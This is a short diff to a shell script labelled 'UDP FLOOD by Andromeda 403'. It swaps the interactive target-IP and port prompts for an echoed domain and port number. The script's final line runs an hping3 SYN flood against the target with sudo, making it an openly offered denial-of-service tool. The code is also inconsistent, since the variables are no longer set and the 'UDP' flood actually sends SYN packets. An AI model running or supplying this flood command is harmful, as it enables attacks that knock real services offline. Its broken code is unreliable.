@@ -17,8 +17,8 @@ echo
 echo "UDP FLOOD by Andromeda 403 | 403 Forbidden"
 echo
 echo
-echo "Target IP:" && read ip
+echo "Target IP:" viesteal.xyz
 echo
-echo "Target Port:" && read port
+echo "Target Port:" 1
 echo "SENDING ATTACK TO $ip in PORT $port | TO STOP: CTRL + C..."
 sudo hping3 -S --flood -V -p $port $ip
